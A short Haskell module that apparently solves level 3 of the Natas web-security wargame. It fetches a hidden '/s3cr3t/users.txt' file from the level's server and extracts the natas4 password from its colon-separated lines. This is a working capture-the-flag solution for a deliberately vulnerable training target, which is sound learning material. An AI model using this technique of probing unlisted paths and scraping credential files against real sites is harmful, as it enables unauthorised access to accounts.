module Natas.Natas3 where

import           Control.Lens
import qualified Data.ByteString.Lazy.Char8 as C
import           Data.Maybe                 (listToMaybe)
import qualified Data.Text                  as T
import           Data.Text.Encoding         (decodeUtf8)
import           Network.Wreq

import           Natas.Natas

solution :: Solution
solution _ = do
  req <- accessLevel' 3 (parentUri 3 ++ "/s3cr3t/users.txt") id
  let body = (decodeUtf8 . C.toStrict) $ req ^. responseBody
      match =
        (listToMaybe . filter ("natas4" `elem`) . fmap (T.splitOn ":") . T.lines)
          body
  pure $ match >>= (listToMaybe . reverse)
